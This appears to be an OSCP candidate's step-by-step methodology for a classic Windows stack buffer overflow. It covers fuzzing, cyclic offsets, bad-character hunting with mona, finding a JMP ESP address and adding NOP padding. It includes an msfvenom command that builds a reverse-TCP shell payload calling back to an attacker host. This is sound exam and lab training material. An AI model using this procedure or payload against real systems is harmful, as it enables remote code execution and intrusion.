After passing OSCP, various people have asked about my process for the buffer overflow.  Well, here it is.  A few things to note:

1. You should take the time to come up with your own methodology that makes sense to you.
2. My method/scripts uses python3 and pwntools.
3. I am not a professional python programmer, there is likely better ways to do it.
4. The usual disclaimers about doing things at your own risk apply.

-------

#### 1. Start Immunity/app as administrator

#### 2. Confirm connectivity from attack host
```
nc xxx.xxx.xxx.xxx <port>
```

#### 3. Fuzz for crash (See fuzzer template)
```
[root@kali:/r/bof]# python3 fuzzer.py
```

#### 4. Generate cyclic pattern to find exact crash
```
[root@kali:/r/bof]# cyclic 300
aaaabaaacaaadaaaeaa [ .. snip .. ] afaaagaaahaaaiaaa
```

#### 5. Add pattern to "overflow" in exploit.py and repro crash

#### 6. Get offset from address in EIP and set "offset"
Get address in EIP and find number of bytes to EIP:
```
[root@kali:/r/bof]# cyclic -l 0x61616275
2003
```

#### 7. Remove cyclic pattern from "overflow" and replace with "A" * offset
```
offset = 2003 # EIP @ 0x61616275
overflow = b"A" * offset
eip = b"BBBB" # 
```

#### 8. Replicate crash and confirm "B" in EIP

#### 9. Find Bad Characters with mona
- Set working dir:

`!mona config -set workingfolder C:\Windows\Temp`
- Create bytearray (without bad chars we know about)

`!mona bytearray --cpb "\x00"` 
- Include list chars in payload (without \x00)
```
badchars = [0x00] # start with null
```
- Repro crash with charpayload
- After the crash use mona to find the next bad char:

`!mona compare -f C:\Windows\Temp\bytearray.bin -a esp`
- Note new bad char, add it to "badchars"
- Repeat steps until no new bad chars are reported

#### 10. Find Jump Point using bad chars (running or crashed) - will be in "Log Data" window
```
!mona jmp -r esp -cpb "\x00\x23\x3c\x83\xba"
```

#### 11. Put jmp address in "eip" var backwards (little endian)
```
eip = b"\xfa\x11\x50\x62" # 625011AF
```

#### 12. Generate shellcode without bad chars and add as "sc" var
```
[root@kali:/r/bof]# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.230 LPORT=6666 EXITFUNC=thread -b "\x00\x23\x3c\x83\xba" -f python -v sc
```

#### 13. Add shellcode

#### 14. Add NOPs as needed and comment out "charpayload"
```
padding = b"\x90" * 16
```
#### 15. Get shell 
